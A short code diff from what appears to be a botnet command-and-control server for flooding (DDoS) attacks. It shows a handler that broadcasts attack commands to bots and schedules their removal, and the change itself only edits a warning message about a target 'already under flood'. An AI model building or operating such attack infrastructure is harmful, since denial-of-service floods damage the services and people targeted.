@@ -228,7 +228,7 @@ def command_line(client, username):
                                             threading.Thread(target=removeAttacks, args=(username, int(secs))).start()
                                             broadcast(data)
                                         else:
-                                            send(client, Fore.RED + "Target is already under flood, don't abuse it >:C!\n")
+                                            send(client, Fore.RED + "Target is already under flood, don't abuse it!\n")
                                     else:
                                         send(client, Fore.RED + "Attack already sent!\n")
                                 else:
